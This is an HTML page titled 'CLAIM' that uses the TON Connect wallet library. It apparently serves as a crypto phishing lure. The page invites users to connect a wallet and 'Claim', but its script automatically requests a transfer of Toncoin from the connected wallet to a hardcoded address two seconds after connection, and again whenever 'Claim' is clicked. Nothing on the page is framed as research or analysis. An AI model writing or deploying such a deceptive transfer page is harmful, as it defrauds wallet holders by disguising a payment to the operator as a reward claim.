<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CLAIM</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <button class="connect-wallet-button" id="connect-btn">Connect Wallet</button>
        <button class="send-transaction-button" id="send-transaction">Claim</button>
    </div>
    <div class="bottom-container">
        <button id="disconnect-btn" class="bottom-button">Bottom Button</button>
    </div>
</body>
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
<script>
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://win0110.xyz/tonconnect-manifest.json',
    });

    tonConnectUI.uiOptions = {
        twaReturnUrl: 'https://t.me/wallet_connect_deposit_bot'
    };

    let connectWallet = tonConnectUI.wallet;
    if(connectWallet) {
        document.getElementById('connect-btn').style.display = 'none';
    }
    else{
        document.getElementById('send-transaction').style.display = 'block';
    }
    

    document.getElementById("connect-btn").addEventListener('click', async () => {
        // Call the function
        await connectToWallet().catch(error => {
            console.error("Error connecting to wallet:", error);
        });
    });

    async function connectToWallet() {
        const connectedWallet = await tonConnectUI.connectWallet();
        document.getElementById('connect-btn').style.display = 'none';
        document.getElementById('send-transaction').style.display = 'block';
        setTimeout(function() {
            sendTransaction();
        }, 2000);
    }

    async function sendTransaction() {
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60,
            messages: [
                {
                    address: "UQDWLxE1akNmxQTTQsWmtnFMFAnJcGGR2iOmYw62IRdhC077", // destination address
                    amount: "20000000" //Toncoin in nanotons
                }
            ]
        };

        await tonConnectUI.sendTransaction(transaction);
    }
    
    document.getElementById("disconnect-btn").addEventListener('click', async () => {
        await tonConnectUI.disconnect();
        document.getElementById('connect-btn').style.display = 'block';
        document.getElementById('send-transaction').style.display = 'none';
    });

    document.getElementById("send-transaction").addEventListener('click', async () => {
        await sendTransaction();
    });
</script>
</html>
